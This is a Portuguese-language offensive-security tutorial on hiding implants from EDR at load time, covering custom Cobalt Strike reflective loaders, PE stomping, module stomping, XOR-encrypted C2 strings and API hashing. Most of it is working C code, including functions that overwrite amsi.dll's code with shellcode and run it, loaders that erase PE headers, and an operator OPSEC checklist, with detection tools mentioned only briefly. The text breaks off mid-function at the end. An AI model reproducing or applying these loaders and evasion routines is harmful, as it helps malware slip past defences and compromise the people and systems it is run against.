---
layout: cyber
section: evasao
title: "Evasão em Load Time — UDRL, PE Stomping, Module Stomping e Ofuscação de Imports"
---

# Evasão em Load Time — UDRL, PE Stomping, Module Stomping e Ofuscação de Imports

## O Momento de Maior Visibilidade do Implant

"Load time" refere-se ao período em que um implant ou payload é carregado na memória antes de iniciar sua execução principal. É um momento de altíssima visibilidade para EDRs: loaders de DLL, file-backed mappings, headers MZ em memória, e padrões de import table são todos inspecionados neste momento. A maioria dos implants comerciais (Cobalt Strike, Sliver, Brute Ratel) tem padrões conhecidos neste momento — o que os torna detectáveis por scanners de memória.

Técnicas de evasão em load time visam modificar ou ocultar esses padrões antes que o implant comece a operar. O benefício é duplo: menor probabilidade de detecção inicial, e menor superfície de assinatura para scanners periódicos. A desvantagem é complexidade de implementação — cada técnica requer entendimento profundo da estrutura PE e do funcionamento do loader do Windows.

Este documento assume familiaridade com estrutura PE (MZ header, Optional Header, Section Table, Import Directory, Relocation Table). Se necessário, revisar PE format antes de continuar.

---

## Como o EDR Inspeciona Load Time

### O Problema: Por Que Implants São Detectados em Load Time

Quando um beacon/implant é carregado na memória:

```
1. MZ header visível (bytes 4D 5A no início do allocation)
2. PE headers intactos (IMAGE_NT_HEADERS, section table)
3. Import table revela APIs usadas (VirtualAlloc, CreateThread → red flag)
4. Strings plaintexts no .data/.rdata (C2 address, mutex names, etc.)
5. Seção de código com permissão RX (Readable + Executable)
6. Alocação anônima (não backed by file on disk)
```

EDRs e scanners como `pe-sieve`, `moneta`, e `BeaconEye` identificam regiões com essas características e as classificam como suspeitas ou definitivamente maliciosas.

---

## Na Prática

### UDRL — User Defined Reflective Loader

#### O Que É Reflective Loading

Reflective Loading é a técnica de carregar uma DLL na memória sem usar a API `LoadLibrary` do Windows e sem a DLL estar presente como arquivo no disco. O DLL contém seu próprio mini-loader embutido que:

1. Encontra sua própria base na memória
2. Processa seus próprios relocations
3. Resolve seus próprios imports
4. Executa sua DllMain

A biblioteca original é o `ReflectiveDLLInjection` de Stephen Fewer (2011), que introduziu a função `ReflectiveDllInjection` como entry point especial.

#### Como o Loader Padrão do Cobalt Strike Funciona

O Cobalt Strike usa um reflective loader embutido no beacon DLL. O processo:

```
1. Stager shellcode baixa o beacon DLL stageless (ou Beacon é injetado diretamente)
2. O shellcode localiza a função ReflectiveDllInjection no DLL injetado
   (busca pela export ordinal especial ou pelo hash da string)
3. Chama ReflectiveDllInjection()
4. O loader dentro do beacon:
   a. Usa PEB (Process Environment Block) para encontrar kernel32.dll e ntdll.dll
   b. Resolve VirtualAlloc, LoadLibraryA, GetProcAddress via hash walking
   c. Aloca nova região de memória do tamanho correto
   d. Copia seções do DLL para nova alocação
   e. Processa relocations (IMAGE_DIRECTORY_ENTRY_BASERELOC)
   f. Resolve imports (IMAGE_DIRECTORY_ENTRY_IMPORT)
   g. Chama DllMain com DLL_PROCESS_ATTACH
```

**Problema com o loader padrão**: O loader padrão do CS tem assinatura conhecida. Os primeiros bytes do loader, o processo de hash walking, e certos padrões de memória são identificados por:
- Elastic: regra `Windows.Trojan.CobaltStrike` (detecta loader pattern)
- Defender: detecta hash walking via IoT
- BeaconEye: detecta estrutura de configuração do beacon na memória

#### Como Criar um UDRL Customizado

O Arsenal Kit do Cobalt Strike permite substituir a função `ReflectiveDllInjection` por um loader customizado. O loader customizado pode:

```c
// Assinatura que o CS espera do UDRL
// O UDRL deve ser exportado como função sem parâmetros
// O CS injeta e chama a função diretamente

// loader.c — UDRL customizado básico

#include <windows.h>

// Macros para PEB walking (encontrar funções sem imports)
#define DEREF(name) *(UINT_PTR *)(name)
#define DEREF_64(name) *(DWORD64 *)(name)
#define DEREF_32(name) *(DWORD *)(name)
#define DEREF_16(name) *(WORD *)(name)
#define DEREF_8(name) *(BYTE *)(name)

// Hash DJB2 para API hashing (ver seção Import Obfuscation)
DWORD HashStringDJB2(const char* str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}

// Encontrar base de módulo via PEB
HMODULE FindModuleByHash(DWORD targetHash) {
    // Acessar PEB via GS register (x64) ou FS (x86)
    #ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    #else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
    #endif
    
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY pListEntry = pLdr->InMemoryOrderModuleList.Flink;
    
    while (pListEntry != &pLdr->InMemoryOrderModuleList) {
        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(
            pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        
        if (pEntry->BaseDllName.Buffer) {
            // Converter wide string para lowercase e fazer hash
            char moduleName[256] = {0};
            WideCharToMultiByte(CP_ACP, 0, 
                pEntry->BaseDllName.Buffer,
                pEntry->BaseDllName.Length / 2,
                moduleName, sizeof(moduleName), NULL, NULL);
            
            // Lowercase
            for (int i = 0; moduleName[i]; i++)
                if (moduleName[i] >= 'A' && moduleName[i] <= 'Z')
                    moduleName[i] += 32;
            
            if (HashStringDJB2(moduleName) == targetHash)
                return (HMODULE)pEntry->DllBase;
        }
        pListEntry = pListEntry->Flink;
    }
    return NULL;
}

// Entry point do UDRL — chamado pelo CS após injeção
// Deve processar o DLL e retornar o endereço de DllMain
DLLEXPORT ULONG_PTR ReflectiveDllInjection(VOID) {
    // 1. Encontrar nossa própria base na memória
    // (truque: usar endereço da própria função e voltar para MZ)
    ULONG_PTR uiLibraryAddress = (ULONG_PTR)ReflectiveDllInjection;
    
    while (TRUE) {
        // Verificar se encontramos o MZ header
        if (DEREF_16(uiLibraryAddress) == 0x5A4D) // "MZ"
            break;
        uiLibraryAddress--;
    }
    
    // 2. Encontrar kernel32.dll e ntdll.dll via PEB
    // Hash de "kernel32.dll" (lowercase) com DJB2
    HMODULE hKernel32 = FindModuleByHash(0x6A4ABC5B); // hash calculado offline
    
    // 3. Resolver VirtualAlloc, LoadLibraryA, GetProcAddress
    // (via export table walking com hashing)
    // ...
    
    // 4. Alocar memória para o DLL
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)uiLibraryAddress;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(
        uiLibraryAddress + pDosHeader->e_lfanew);
    
    // CUSTOMIZAÇÃO #1: Não alocar com PAGE_EXECUTE_READWRITE
    // Alocar com PAGE_READWRITE, depois usar VirtualProtect
    // Isso evita alocações RWX que são red flag
    LPVOID pNewBase = VirtualAlloc(
        (LPVOID)pNtHeaders->OptionalHeader.ImageBase,
        pNtHeaders->OptionalHeader.SizeOfImage,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE);  // Não RWX!
    
    if (!pNewBase) {
        // Se preferred base não disponível, alocar em qualquer lugar
        pNewBase = VirtualAlloc(NULL,
            pNtHeaders->OptionalHeader.SizeOfImage,
            MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    }
    
    // 5. Copiar headers e seções
    memcpy(pNewBase, (PVOID)uiLibraryAddress, 
           pNtHeaders->OptionalHeader.SizeOfHeaders);
    
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++, pSection++) {
        if (pSection->SizeOfRawData) {
            memcpy((BYTE*)pNewBase + pSection->VirtualAddress,
                   (BYTE*)uiLibraryAddress + pSection->PointerToRawData,
                   pSection->SizeOfRawData);
        }
    }
    
    // 6. Processar relocations
    // ...
    
    // 7. Resolver imports
    // ...
    
    // CUSTOMIZAÇÃO #2: Após resolver, zeramos o header MZ
    // Isso evita detecção por scanners que buscam "MZ" em regiões executáveis
    ZeroMemory(pNewBase, pNtHeaders->OptionalHeader.SizeOfHeaders);
    
    // 8. Setar permissões corretas por seção
    pSection = IMAGE_FIRST_SECTION(
        (PIMAGE_NT_HEADERS)((BYTE*)pNewBase + pDosHeader->e_lfanew));
    
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++, pSection++) {
        DWORD sectionProt = PAGE_NOACCESS;
        BOOL canExec = pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE;
        BOOL canRead = pSection->Characteristics & IMAGE_SCN_MEM_READ;
        BOOL canWrite = pSection->Characteristics & IMAGE_SCN_MEM_WRITE;
        
        if (canExec && canRead && !canWrite)
            sectionProt = PAGE_EXECUTE_READ;  // .text normal
        else if (canRead && canWrite && !canExec)
            sectionProt = PAGE_READWRITE;     // .data normal
        else if (canRead && !canWrite && !canExec)
            sectionProt = PAGE_READONLY;      // .rdata normal
        
        VirtualProtect((BYTE*)pNewBase + pSection->VirtualAddress,
                       pSection->Misc.VirtualSize,
                       sectionProt, &sectionProt);
    }
    
    // 9. Chamar DllMain
    typedef BOOL (WINAPI *DLLMAIN)(HINSTANCE, DWORD, LPVOID);
    DLLMAIN pDllMain = (DLLMAIN)((BYTE*)pNewBase + 
        pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    
    pDllMain((HINSTANCE)pNewBase, DLL_PROCESS_ATTACH, NULL);
    
    return (ULONG_PTR)pNewBase;
}
```

#### Arsenal Kit — O Que Inclui

O Arsenal Kit é um kit de desenvolvimento vendido separadamente para usuários do Cobalt Strike. Contém:

```
arsenal-kit/
├── kits/
│   ├── udrl/          ← UDRL templates (loader customizável)
│   │   ├── src/
│   │   │   ├── ReflectiveDll.c    ← Template base do loader
│   │   │   └── ReflectiveLoader.h
│   │   └── build.sh
│   ├── sleepmask/     ← Sleep mask templates (ver arquivo 08)
│   │   ├── src/
│   │   │   ├── sleepmask.c        ← Implementação base
│   │   │   └── sleepmask.h
│   │   └── build.sh
│   └── resource/      ← Resource kit (modificar recursos do beacon)
│       ├── src/
│       └── build.sh
└── Makefile
```

**Configurar Arsenal Kit no Cobalt Strike**:

```
# 1. Compilar o UDRL
cd arsenal-kit/kits/udrl
./build.sh

# 2. No Cobalt Strike client, carregar via Aggressor Script:
# Malleable C2 Profile → [Arsenal Kit section]

# 3. Ou via aggressor script:
```

```java
// Arsenal Kit Aggressor Script Integration
// custom_loader.cna

# Registrar UDRL customizado
beacon_stage_set("x64", "C:\\arsenal-kit\\kits\\udrl\\udrl.x64.o");

# Ou via hook de estágio
set BEACON_LOADER_X64 "C:\\arsenal-kit\\udrl.x64.o";
```

---

### PE Stomping

#### Conceito

PE Stomping é a técnica de mapear uma DLL legítima em memória e sobrescrever seu conteúdo com o payload malicioso. O resultado é uma região de memória que:
- Aparece no Process Hacker/Task Manager como a DLL legítima (pelo nome do mapping)
- Está "backed" por um arquivo legítimo no disco
- Mas seu conteúdo em memória é diferente do arquivo no disco

```
[disco]                          [memória]
legit.dll ──── MapViewOfFile ───> Região de memória
               (mapping)          (backed by legit.dll)
                                  |
                                  | WriteProcessMemory
                                  | (sobrescreve com shellcode)
                                  v
                                  [shellcode/PE malicioso]
                                  (ainda aparece como legit.dll)
```

#### Implementação Passo a Passo

```c
#include <windows.h>
#include <stdio.h>

// Shellcode de exemplo (substituir pelo payload real)
unsigned char shellcode[] = {
    0x90, 0x90, 0x90, // NOPs
    // ... shellcode real aqui
};

BOOL PEStomp(const char* legitimateDLL, PVOID shellcode, SIZE_T shellcodeSize)
{
    // 1. Abrir DLL legítima do disco
    HANDLE hFile = CreateFileA(
        legitimateDLL,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Falha ao abrir DLL: %d\n", GetLastError());
        return FALSE;
    }
    
    // 2. Criar mapping do arquivo (com SEC_IMAGE para parsing correto)
    // ATENÇÃO: SEC_IMAGE mapeia como imagem PE (processa relocations, etc.)
    // PAGE_WRITECOPY permite CoW (Copy-on-Write)
    HANDLE hMapping = CreateFileMappingA(
        hFile,
        NULL,
        PAGE_EXECUTE_WRITECOPY,  // WRITECOPY = CoW
        0, 0, NULL);
    
    if (!hMapping) {
        printf("[-] Falha ao criar mapping: %d\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }
    
    // 3. Mapear view com COPY_ON_WRITE
    PVOID pMappedView = MapViewOfFile(
        hMapping,
        FILE_MAP_EXECUTE | FILE_MAP_COPY,  // COPY = CoW
        0, 0, 0);
    
    if (!pMappedView) {
        printf("[-] Falha ao mapear view: %d\n", GetLastError());
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return FALSE;
    }
    
    // 4. A região agora é backed by legit.dll mas com CoW
    //    Podemos escrever sem afetar o arquivo no disco
    DWORD oldProtect;
    VirtualProtect(pMappedView, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // 5. Sobrescrever com shellcode/payload
    memcpy(pMappedView, shellcode, shellcodeSize);
    
    // 6. Restaurar proteção (RX para não ter RWX)
    VirtualProtect(pMappedView, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
    
    printf("[+] PE Stomp completo em: %p\n", pMappedView);
    printf("[+] Backed by: %s\n", legitimateDLL);
    
    // 7. Executar shellcode no mapping
    // (criar thread apontando para início do mapping)
    HANDLE hThread = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)pMappedView,
        NULL, 0, NULL);
    
    WaitForSingleObject(hThread, INFINITE);
    
    // 8. Cleanup
    UnmapViewOfFile(pMappedView);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    return TRUE;
}

// Uso:
// PEStomp("C:\\Windows\\System32\\amsi.dll", shellcode, sizeof(shellcode));
```

**Implicações de Detecção do PE Stomp**:

```
1. MBI.Type == MEM_MAPPED (não MEM_PRIVATE ou MEM_IMAGE)
   → Scanners como pe-sieve detectam: "mapped from file but content differs"
   
2. GetMappedFileName retorna caminho legítimo
   → Mas hash do conteúdo em memória ≠ hash do arquivo em disco
   
3. VAD (Virtual Address Descriptor) aponta para arquivo legítimo
   → Mas bytes em memória revelam MZ header ou shellcode

Detecção via:
   - pe-sieve --pid=<PID> --modules --no-hooks
   - moneta --pid <PID>
   - Verificar discrepância hash em disco vs memória
```

---

### Module Stomping

#### Conceito e Diferença do PE Stomp

Module Stomping é uma variante mais sofisticada: ao invés de mapear uma DLL e sobrescrevê-la, carregamos a DLL via `LoadLibrary` (processo legítimo) e depois sobrescrevemos a seção `.text` com nosso shellcode.

**Vantagens sobre PE Stomp**:
- O módulo aparece na lista de módulos carregados (`EnumProcessModules`, `LdrData`)
- É "backed" por arquivo legítimo em disco
- Tem nome legítimo na lista de módulos
- Passa por verificações que listam módulos carregados

```
LoadLibraryA("amsi.dll")
    → DLL carregada pelo loader do Windows
    → Aparece em lista de módulos como "amsi.dll"
    → MBI.Type == MEM_IMAGE (mais legítimo que MEM_MAPPED)
    |
    v
VirtualProtect(amsi_base + text_offset, text_size, PAGE_READWRITE, &old)
    → Seção .text agora writable
    |
    v
memcpy(amsi_base + text_offset, shellcode, shellcodeSize)
    → Sobrescreve código original de amsi.dll com shellcode
    |
    v
VirtualProtect(amsi_base + text_offset, shellcodeSize, PAGE_EXECUTE_READ, &old)
    → Restaura como Execute+Read (não RWX)
    |
    v
CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(amsi_base + text_offset), ...)
    → Thread executa shellcode, que "aparece" estar em amsi.dll
```

#### Implementação Completa

```c
#include <windows.h>
#include <psapi.h>

BOOL ModuleStomp(const char* targetDLL, PVOID shellcode, SIZE_T shellcodeSize)
{
    // 1. Carregar DLL via LoadLibrary (processo legítimo)
    // Isso registra o módulo no PEB LDR corretamente
    HMODULE hModule = LoadLibraryExA(
        targetDLL,
        NULL,
        DONT_RESOLVE_DLL_REFERENCES);  // Não executa DllMain nem resolve imports
    
    if (!hModule) {
        printf("[-] LoadLibrary falhou: %d\n", GetLastError());
        return FALSE;
    }
    
    printf("[+] %s carregado em: %p\n", targetDLL, hModule);
    
    // 2. Parsear PE headers para encontrar seção .text
    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(
        (BYTE*)hModule + pDosHdr->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHdrs);
    
    PVOID textBase = NULL;
    SIZE_T textSize = 0;
    
    for (WORD i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++, pSection++) {
        if (strncmp((char*)pSection->Name, ".text", 5) == 0) {
            textBase = (BYTE*)hModule + pSection->VirtualAddress;
            textSize = pSection->Misc.VirtualSize;
            printf("[+] Seção .text: base=%p, tamanho=%zu\n", textBase, textSize);
            break;
        }
    }
    
    if (!textBase || shellcodeSize > textSize) {
        printf("[-] Seção .text não encontrada ou shellcode muito grande\n");
        FreeLibrary(hModule);
        return FALSE;
    }
    
    // 3. Tornar seção .text writable (temporariamente)
    DWORD oldProtect;
    if (!VirtualProtect(textBase, shellcodeSize, PAGE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect RW falhou: %d\n", GetLastError());
        FreeLibrary(hModule);
        return FALSE;
    }
    
    // 4. Copiar shellcode sobre o código legítimo
    // ATENÇÃO: Isso destrói o código original da DLL
    // Se outros threads usam esta DLL, pode causar crash
    memcpy(textBase, shellcode, shellcodeSize);
    
    // Opcional: preencher o resto da seção com NOPs para aparência mais limpa
    if (shellcodeSize < textSize) {
        memset((BYTE*)textBase + shellcodeSize, 0x90, 
               min(textSize - shellcodeSize, 1024));
    }
    
    // 5. Restaurar proteção como Execute+Read (não RWX — menos suspeito)
    DWORD finalProtect;
    VirtualProtect(textBase, shellcodeSize, PAGE_EXECUTE_READ, &finalProtect);
    
    // 6. Criar thread que executa o shellcode
    // A thread aparece como estando "dentro de amsi.dll" para ferramentas de análise
    HANDLE hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)textBase,
        NULL,
        0,
        NULL);
    
    if (!hThread) {
        printf("[-] CreateThread falhou: %d\n", GetLastError());
        return FALSE;
    }
    
    printf("[+] Thread executando shellcode em %s!+0x%x\n", 
           targetDLL, 
           (DWORD)((BYTE*)textBase - (BYTE*)hModule));
    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    
    return TRUE;
}

// Uso com DLL que tem baixo uso em processos comuns:
// ModuleStomp("amsi.dll", shellcode, sizeof(shellcode));
// ModuleStomp("wldp.dll", shellcode, sizeof(shellcode));
// ModuleStomp("fhsvc.dll", shellcode, sizeof(shellcode));
```

**Considerações de OPSEC**:

```
DLLs boas candidatas para module stomping:
  - amsi.dll      : AMSI library, raramente chamada diretamente
  - wldp.dll      : Windows Lockdown Policy, baixo uso
  - diasymreader.dll: Debug symbols, raramente carregada
  
DLLs ruins para module stomping:
  - kernel32.dll  : Usada por tudo — crash imediato
  - ntdll.dll     : Fundamental ao processo
  - user32.dll    : UI threads dependem dela
  
Detectado por:
  - pe-sieve: detecta "module stomping" quando hash em memória ≠ disco
  - Get-InjectedThread (PowerShell): detecta threads em módulos com conteúdo modificado
  - Volatility: malfind, pe-sieve plugin
```

---

### String Encryption no Beacon

#### Por Que Strings em Plaintext São Detectadas

Strings como endereços C2, nomes de mutex, User-Agent headers, e strings características do Cobalt Strike (ex: `Content-Type: application/octet-stream`) são assinaturas estáticas que:

1. Scanners de arquivo (AV/EDR) detectam por hash de sequência
2. Scanners de memória (BeaconEye, pe-sieve) varrem regiões executáveis
3. Regras YARA capturam padrões específicos
4. Strings extraídas via `strings.exe` revelam intenção

#### Runtime String Construction

```c
// RUIM — string em plaintext detectável:
char* c2 = "https://192.168.1.100/api/data";

// BOM — string construída em runtime via XOR:
// Primeiro, gerar versão XOR offline com Python:
// key = 0x41
// encrypted = [b ^ key for b in b"https://192.168.1.100/api/data"]

// Em C:
void DecryptString(char* output, const unsigned char* encrypted, 
                   size_t len, unsigned char key)
{
    for (size_t i = 0; i < len; i++)
        output[i] = encrypted[i] ^ key;
    output[len] = '\0';
}

// String criptografada (gerada offline com key=0x41):
const unsigned char encryptedC2[] = {
    0x29, 0x37, 0x37, 0x35, 0x73, 0x76, 0x76, 0x76,  // https://
    0x72, 0x78, 0x78, 0x78, 0x78, 0x79, 0x78, 0x79,  // (números)
    // ... resto da string XOR'd com 0x41
};

// Uso:
char c2Buffer[64];
DecryptString(c2Buffer, encryptedC2, sizeof(encryptedC2), 0x41);
// c2Buffer agora contém "https://192.168.1.100/api/data"
// mas nunca existiu como plaintext em memória

// Para strings críticas: usar Stack Strings (char por char na stack)
// Isso evita que fiquem na seção .data
void StackStringDemo() {
    // "cmd.exe" construída na stack byte a byte
    char cmd[8];
    cmd[0] = 'c'; cmd[1] = 'm'; cmd[2] = 'd';
    cmd[3] = '.'; cmd[4] = 'e'; cmd[5] = 'x';
    cmd[6] = 'e'; cmd[7] = '\0';
    // ... uso de cmd
    // Zerar após uso:
    SecureZeroMemory(cmd, sizeof(cmd));
}
```

---

### Import Obfuscation — API Hashing

#### Por Que Imports Suspeitos São Detectados

A IAT (Import Address Table) de um PE é a primeira coisa que um analista verifica. Um executável que importa `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread` da kernel32.dll, ou `NtAllocateVirtualMemory` da ntdll.dll grita "injection" antes mesmo de ser executado.

Scanners como `DIE (Detect-It-Easy)`, `CFF Explorer`, e regras YARA identificam essas combinações como suspeitas.

#### Solução: GetProcAddress + Hash (DJB2)

Ao invés de importar funções diretamente (que aparecem na IAT), usar GetProcAddress em runtime com o nome da função. Mas mesmo GetProcAddress com string literal é detectável (a string "VirtualAllocEx" aparece no .rdata).

Solução: usar hash da string para identificar a função:

```c
// API Hashing com DJB2

// Hash para "VirtualAllocEx": calcular offline
// Python: hash = 5381; [hash := ((hash << 5) + hash) + c for c in "VirtualAllocEx"]
// Resultado: 0x???????

#define HASH_VIRTUAL_ALLOC_EX  0x8CF8AF8B  // exemplo
#define HASH_WRITE_PROC_MEM    0x2A6B2BAD  // exemplo
#define HASH_CREATE_THREAD_EX  0x1B7F7F1A  // exemplo

// Calcular hash DJB2 em runtime
DWORD HashAPI(const char* str) {
    DWORD hash = 5381;
    while (*str)
        hash = ((hash << 5) + hash) + (DWORD)*str++;
    return hash;
}

// Encontrar export por hash (sem GetProcAddress)
PVOID GetProcAddressByHash(HMODULE hModule, DWORD targetHash)
{
    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(
        (BYTE*)hModule + pDosHdr->e_lfanew);
    
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)hModule + pNtHdrs->OptionalHeader.DataDirectory[
            IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    PDWORD pNames = (PDWORD)((BYTE*)hModule + pExportDir->AddressOfNames);
    PWORD pOrdinals = (PWORD)((BYTE*)hModule + pExportDir->AddressOfNameOrdinals);
    PDWORD pFunctions = (PDWORD)((BYTE*)hModule + pExportDir->AddressOfFunctions);
    
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        const char* funcName = (char*)((BYTE*)hModule + pNames[i]);
        
        if (HashAPI(funcName) == targetHash) {
            WORD ordinal = pOrdinals[i];
            return (PVOID)((BYTE*)hModule + pFunctions[ordinal]);
        }
    }
    return NULL;
}

// Uso:
typedef LPVOID (WINAPI *pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);

HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");  // Ainda detectável!
// Melhor: encontrar kernel32 via PEB walking

pVirtualAllocEx fnVirtualAllocEx = (pVirtualAllocEx)
    GetProcAddressByHash(hKernel32, HASH_VIRTUAL_ALLOC_EX);

// Agora a string "VirtualAllocEx" não existe no binário!
LPVOID allocation = fnVirtualAllocEx(hProcess, NULL, 4096,
    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

#### FNV1a Hash (alternativa ao DJB2)

```c
// FNV1a é mais rápido e tem melhor distribuição para strings curtas
DWORD HashFNV1a(const char* str) {
    DWORD hash = 0x811C9DC5;  // FNV offset basis
    while (*str) {
        hash ^= (DWORD)*str++;
        hash *= 0x01000193;   // FNV prime
    }
    return hash;
}
```

#### Lazy Loading com Hashing Completo

```c
// Estrutura de cache de APIs resolvidas
typedef struct _API_CACHE {
    PVOID pNtAllocateVirtualMemory;
    PVOID pNtWriteVirtualMemory;
    PVOID pNtCreateThreadEx;
    PVOID pNtOpenProcess;
    PVOID pLdrLoadDll;
} API_CACHE, *PAPI_CACHE;

API_CACHE g_apis = {0};

// Inicializar cache resolvendo hashes
BOOL InitAPICache() {
    // Encontrar ntdll via PEB (sem strings detectáveis)
    HMODULE hNtdll = FindModuleByHash(0x3CFA685D); // hash de "ntdll.dll"
    
    g_apis.pNtAllocateVirtualMemory = 
        GetProcAddressByHash(hNtdll, 0x38AABF3A);  // hash de NtAllocateVirtualMemory
    
    g_apis.pNtWriteVirtualMemory = 
        GetProcAddressByHash(hNtdll, 0xC3170192);  // hash de NtWriteVirtualMemory
    
    g_apis.pNtCreateThreadEx = 
        GetProcAddressByHash(hNtdll, 0xAF18C706);  // hash de NtCreateThreadEx
    
    return (g_apis.pNtAllocateVirtualMemory != NULL);
}
```

---

## Exemplos de Código / Comandos

### Verificar Resultado das Técnicas

```powershell
# Verificar se um processo tem módulos com content diferente do disco
# (detectar PE Stomp / Module Stomp)

# Usando pe-sieve
.\pe-sieve64.exe --pid 4821 --modules --no-hooks --dump_mode 1

# Usando Get-InjectedThread (PowerShell)
function Get-InjectedThread {
    $Processes = Get-Process
    foreach ($Process in $Processes) {
        try {
            $Threads = $Process.Threads
            foreach ($Thread in $Threads) {
                $Stack = [System.Runtime.InteropServices.Marshal]::ReadIntPtr(
                    $Thread.Handle, 0)
                # Verificar se start address está em região anônima
                # (simplificado — na prática usa VirtualQueryEx)
            }
        } catch {}
    }
}

# Verificar import table de um binário
# (verificar se tem imports suspeitos ou se usa hash-based resolution)
dumpbin /imports payload.exe
# OU
python3 -c "import pefile; pe=pefile.PE('payload.exe'); [print(f'  {imp.name.decode()}') for entry in pe.DIRECTORY_ENTRY_IMPORT for imp in entry.imports if imp.name]"
```

### Script Python para Pré-Calcular Hashes de API

```python
#!/usr/bin/env python3
# pre_calc_hashes.py — Calcular hashes DJB2 para APIs comuns

def djb2(s):
    hash_val = 5381
    for c in s:
        hash_val = ((hash_val << 5) + hash_val) + ord(c)
        hash_val &= 0xFFFFFFFF
    return hash_val

def fnv1a(s):
    hash_val = 0x811C9DC5
    for c in s:
        hash_val ^= ord(c)
        hash_val = (hash_val * 0x01000193) & 0xFFFFFFFF
    return hash_val

apis = [
    "NtAllocateVirtualMemory",
    "NtWriteVirtualMemory", 
    "NtCreateThreadEx",
    "NtOpenProcess",
    "NtReadVirtualMemory",
    "VirtualAllocEx",
    "WriteProcessMemory",
    "CreateRemoteThread",
    "LdrLoadDll",
    "kernel32.dll",
    "ntdll.dll",
    "GetProcAddress",
]

print("// API Hash Table (DJB2)")
for api in apis:
    print(f"// {api}")
    print(f"#define HASH_{api.upper().replace('.', '_')} 0x{djb2(api):08X}UL")
    print(f"// FNV1a: 0x{fnv1a(api):08X}UL")
    print()
```

---

## Detecção e OPSEC

### Resumo de Detecção por Técnica

| Técnica | Ferramenta de Detecção | Indicador |
|---|---|---|
| UDRL sem customização | BeaconEye, Elastic | Hash walking pattern |
| UDRL customizado | pe-sieve (MEM_PRIVATE sem backing file) | Região anônima executável |
| PE Stomp | pe-sieve, moneta | content hash ≠ disco hash |
| Module Stomp | pe-sieve, Get-InjectedThread | .text modificado em módulo carregado |
| Import hashing | Reversão manual, sandboxes | Ausência de imports na IAT |
| String XOR | Sandboxes dinâmicas | Decriptação em runtime observada |

### Checklist OPSEC para Load Time

```
[ ] UDRL customizado sem padrões do loader padrão do CS
[ ] MZ header zerado após carregamento
[ ] Alocação com PAGE_READWRITE → exec com VirtualProtect (não RWX direta)
[ ] Strings críticas XOR'd ou construídas na stack
[ ] API resolution via hash (sem imports suspeitos na IAT)
[ ] Module stomping em DLL de baixo uso
[ ] Verificar discrepância disco/memória antes de operação longa
[ ] Sleep mask ativa durante períodos de espera (ver arquivo 08)
```

---

## Custom WinAPI Functions — Manual GetModuleHandle / GetProcAddress

### Por Que Implementar à Mão

`GetModuleHandleA("ntdll")` + `GetProcAddress(hMod, "NtAllocateVirtualMemory")` são:
- Hookadas por EDR (userland hook em kernel32).
- Aparecem em IAT do binário → static analysis revela API surface.
- Strings com nomes de função detectáveis.

Implementar versões custom via **PEB walk** elimina dependência de IAT e bypassa hooks em GetProcAddress.

### PEB Walk para GetModuleHandle Custom

```c
#include <windows.h>
#include <winternl.h>

HMODULE GetModuleHandleCustom(LPCWSTR pwszName) {
    // PEB acessível via TEB (gs:[0x60] em x64)
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA pLdr = pPeb->Ldr;

    // Walk InMemoryOrderModuleList
    PLIST_ENTRY pHead = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY pCur  = pHead->Flink;

    while (pCur != pHead) {
        // LDR_DATA_TABLE_ENTRY shifted by InMemoryOrderLinks offset
        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(
            pCur, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        // Comparar nome (case-insensitive)
        if (pEntry->FullDllName.Buffer && pwszName) {
            // Pegar BaseDllName (fim do path)
            WCHAR* pBase = wcsrchr(pEntry->FullDllName.Buffer, L'\\');
            pBase = pBase ? pBase + 1 : pEntry->FullDllName.Buffer;
